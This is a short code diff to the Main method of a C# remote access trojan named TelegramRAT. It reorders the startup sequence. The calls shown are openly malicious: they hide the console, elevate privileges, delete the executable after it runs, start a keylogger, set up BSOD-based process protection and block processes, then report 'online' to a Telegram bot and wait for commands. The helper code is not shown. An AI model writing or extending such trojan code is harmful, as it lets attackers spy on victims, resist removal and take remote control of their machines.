@@ -8,7 +8,6 @@
 
 
 using System;
-using System.Net;
 
 namespace TelegramRAT
 {
@@ -17,18 +16,12 @@ namespace TelegramRAT
         [STAThreadAttribute]
         static void Main(string[] args)
         {
-
             // Hide console
             persistence.HideConsoleWindow();
             // Mutex check
             persistence.CheckMutex();
             // SSL
-            ServicePointManager.SecurityProtocol = (
-                SecurityProtocolType.Ssl3 |
-                SecurityProtocolType.Tls |
-                SecurityProtocolType.Tls11 |
-                SecurityProtocolType.Tls12
-            );
+            System.Net.ServicePointManager.SecurityProtocol = System.Net.SecurityProtocolType.Ssl3 | System.Net.SecurityProtocolType.Tls | System.Net.SecurityProtocolType.Tls11 | System.Net.SecurityProtocolType.Tls12;
             // Get admin rights
             persistence.elevatePrevileges();
             // Delay before starting
@@ -43,15 +36,15 @@ namespace TelegramRAT
             persistence.MeltFile();
             // Check internet connection
             utils.isConnectedToInternet();
-            // Send 'online' to telegram bot
-            telegram.sendConnection();
+            // Check for blocked process
+            persistence.processCheckerThread.Start();
             // Start offline keylogger
             utils.keyloggerThread.Start();
             // Protect process (BSOD)
             persistence.protectProcess();
             persistence.PreventSleep();
-            // Check for blocked process
-            persistence.processCheckerThread.Start();
+            // Send 'online' to telegram bot
+            telegram.sendConnection();
             // Wait for new commands
             telegram.waitCommandsThread.Start();
             // Need for system power events
